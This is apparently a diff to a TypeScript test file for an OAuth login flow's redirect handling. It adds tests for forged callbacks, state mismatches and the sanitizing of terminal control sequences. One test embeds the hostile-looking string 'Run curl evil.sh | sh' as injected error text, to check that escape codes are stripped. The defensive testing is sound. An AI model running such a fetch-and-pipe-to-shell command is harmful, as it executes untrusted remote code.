@@ -1,10 +1,10 @@
 import { mkdtempSync } from "node:fs";
-import { createServer } from "node:net";
+import { connect, createServer } from "node:net";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { beforeEach, describe, expect, it } from "vitest";
 import { TokenStore } from "../src/auth.js";
-import { buildAuthorizeUrl, codeFromRedirect, generateState, login } from "../src/login.js";
+import { StateMismatchError, buildAuthorizeUrl, codeFromRedirect, generateState, login } from "../src/login.js";
 import { fakeFetch, json } from "./helpers.js";
 
 async function freePort(): Promise<number> {
@@ -43,12 +43,28 @@ describe("authorization URL", () => {
     for (const scope of scopes.filter((s) => s !== "offline")) expect(scope).toMatch(/^read:/);
   });
 
-  it("validates the redirect", () => {
+  it("validates the redirect, checking state before anything else", () => {
     expect(codeFromRedirect("http://x/cb?code=c1&state=s1", "s1")).toBe("c1");
-    expect(() => codeFromRedirect("http://x/cb?code=c1&state=evil", "s1")).toThrow(/state mismatch/);
-    expect(() => codeFromRedirect("http://x/cb?error=access_denied&error_description=nope", "s1")).toThrow(
+    expect(() => codeFromRedirect("http://x/cb?code=c1&state=evil", "s1")).toThrow(StateMismatchError);
+    // A forged error without our state is a mismatch, not an authorization failure.
+    expect(() => codeFromRedirect("http://x/cb?error=access_denied", "s1")).toThrow(StateMismatchError);
+    expect(() => codeFromRedirect("http://x/cb?error=access_denied&error_description=nope&state=s1", "s1")).toThrow(
       /access_denied \(nope\)/,
     );
+    expect(() => codeFromRedirect("not a url", "s1")).toThrow(/doesn't look like a URL/);
+  });
+
+  it("strips terminal control sequences from WHOOP's error text", () => {
+    const evil = encodeURIComponent("\x1b[2J\x1b[31mRun curl evil.sh | sh");
+    const err = (() => {
+      try {
+        codeFromRedirect(`http://x/cb?state=s1&error=bad&error_description=${evil}`, "s1");
+      } catch (e) {
+        return e as Error;
+      }
+    })();
+    expect(err?.message).not.toMatch(/\x1b/);
+    expect(err?.message).toContain("Run curl evil.sh");
   });
 });
 
@@ -90,7 +106,47 @@ describe("login", () => {
     });
   }
 
-  it("rejects a callback with the wrong state", async () => {
+  it("ignores forged and malformed callbacks, then completes with the real one", async () => {
+    const port = await freePort();
+    const base = `http://127.0.0.1:${port}/callback`;
+    const statuses: number[] = [];
+    const rawRequest = (line: string) =>
+      new Promise<string>((resolve) => {
+        const socket = connect(port, "127.0.0.1", () => socket.end(`${line}\r\nHost: x\r\nConnection: close\r\n\r\n`));
+        let data = "";
+        socket.on("data", (d) => (data += d));
+        socket.on("close", () => resolve(data));
+        socket.on("error", () => resolve(data));
+      });
+    const fetch = tokenEndpoint();
+
+    const creds = await login({
+      clientId: "cid",
+      clientSecret: "secret",
+      redirectUri: base,
+      store,
+      fetch,
+      openBrowser: false,
+      log: () => {},
+      onAuthorizeUrl: (url) => {
+        const state = new URL(url).searchParams.get("state")!;
+        void (async () => {
+          // A web page trying to inject its own code, or to abort the login with an error.
+          statuses.push((await globalThis.fetch(`${base}?code=attacker&state=forged00`)).status);
+          statuses.push((await globalThis.fetch(`${base}?error=access_denied`)).status);
+          // A local process sending a request line URL can't parse.
+          statuses.push((await rawRequest("GET http://[/callback HTTP/1.1")).includes("400") ? 400 : 0);
+          statuses.push((await globalThis.fetch(`${base}?code=the-code&state=${state}`)).status);
+        })();
+      },
+    });
+
+    expect(statuses).toEqual([400, 400, 400, 200]);
+    expect(new URLSearchParams(String(fetch.calls[0].init?.body)).get("code")).toBe("the-code");
+    expect(creds.access_token).toBe("access-1");
+  });
+
+  it("rejects when WHOOP reports an error for our state", async () => {
     const port = await freePort();
     const result = login({
       clientId: "cid",
@@ -100,11 +156,36 @@ describe("login", () => {
       fetch: tokenEndpoint(),
       openBrowser: false,
       log: () => {},
-      onAuthorizeUrl: () => void globalThis.fetch(`http://127.0.0.1:${port}/callback?code=x&state=forged00`),
+      onAuthorizeUrl: (url) => {
+        const state = new URL(url).searchParams.get("state");
+        void globalThis.fetch(`http://127.0.0.1:${port}/callback?error=access_denied&state=${state}`);
+      },
     });
 
-    await expect(result).rejects.toThrow(/state mismatch/);
+    await expect(result).rejects.toThrow(/access_denied/);
     expect(await store.load()).toBeNull();
+  });
+
+  it("asks for the redirected URL when the redirect URI isn't local", async () => {
+    let authorizeUrl = "";
+    const fetch = tokenEndpoint();
+    const creds = await login({
+      clientId: "cid",
+      clientSecret: "secret",
+      redirectUri: "https://example.com/whoop/callback",
+      store,
+      fetch,
+      openBrowser: false,
+      log: () => {},
+      onAuthorizeUrl: (url) => (authorizeUrl = url),
+      prompt: async () => {
+        const state = new URL(authorizeUrl).searchParams.get("state");
+        return `  https://example.com/whoop/callback?code=pasted&state=${state}  `;
+      },
+    });
+
+    expect(creds.refresh_token).toBe("refresh-1");
+    expect(new URLSearchParams(String(fetch.calls[0].init?.body)).get("code")).toBe("pasted");
   });
 
   it("times out if the browser never comes back", async () => {
